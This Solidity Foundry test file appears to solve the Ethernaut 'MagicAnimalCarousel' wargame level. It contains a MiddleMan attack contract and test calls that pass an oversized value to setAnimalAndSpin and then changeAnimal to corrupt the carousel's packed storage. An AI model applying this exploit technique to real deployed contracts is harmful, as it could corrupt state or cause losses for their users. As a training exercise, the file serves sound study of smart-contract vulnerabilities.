// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/MagicAnimalCarousel.sol";

// somehow calling contract with command line doesn't work, thus using a contract
contract MiddleMan {
    constructor(address prey) {
        prey.call(abi.encodeWithSelector(MagicAnimalCarousel.setAnimalAndSpin.selector, "0xFFFFFFFFFFFFFFFFFFFFFFFF"));

        prey.call(abi.encodeWithSelector(MagicAnimalCarousel.changeAnimal.selector, "A", 1));
    }
}

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel instance;

    function setUp() public {
        instance = new MagicAnimalCarousel();
    }

    function test() public {
        uint256 crateId = instance.currentCrateId();
        assertEq(crateId, 0);

        address(instance).call(abi.encodeWithSelector(instance.setAnimalAndSpin.selector, "0xFFFFFFFFFFFFFFFFFFFFFFFF"));

        crateId = instance.currentCrateId();
        // cuz currentCrateId is set to (0xFFFF + 1) % MAX_CAPACITY = 0 again
        assertEq(crateId, 0);

        instance.changeAnimal("A", 1);

        string memory random = "random";
        instance.setAnimalAndSpin(random);

        crateId = instance.currentCrateId();
        assertEq(crateId, 1);

        uint256 existing = instance.carousel(crateId) >> 176;
        uint256 expected = uint256(bytes32(abi.encodePacked(random))) >> 176;
        assertNotEq(existing, expected);
    }
}
